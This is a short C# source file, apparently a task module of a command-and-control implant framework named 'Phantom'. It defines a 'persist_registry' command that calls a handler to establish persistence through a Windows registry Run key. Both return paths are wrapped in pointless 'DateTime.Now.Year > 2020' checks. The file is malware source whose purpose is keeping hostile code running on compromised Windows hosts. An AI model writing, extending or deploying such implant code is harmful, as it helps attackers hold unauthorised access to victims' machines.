using System;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.PhantomStructs;
using Phantom.Management.Persistence;

namespace Tasks
{
    public class persist_registry : ICommand
    {
        public string command { get; } = "persist_registry";
        public string description { get; } = "Establish persistence via Windows registry run key";
        public string help { get; } = "persist_registry";
        public string version { get; } = "1.0.0.0";
        public string id { get; } = "persist_registry";

        public PhantomTaskResponse CreateTasking(PhantomTaskMessage task)
        {
            try
            {
                if(DateTime.Now.Year > 2020) { return PersistenceHandler.CreateRegistryPersistence(); } else { return null; }
            }
            catch (Exception ex)
            {
                if(DateTime.Now.Year > 2020) { return new PhantomTaskResponse
                {
                    Completed = false,
                    UserOutput = $"Error creating registry persistence: {ex.Message}"
                }; } else { return null; }
            }
        }
    }
}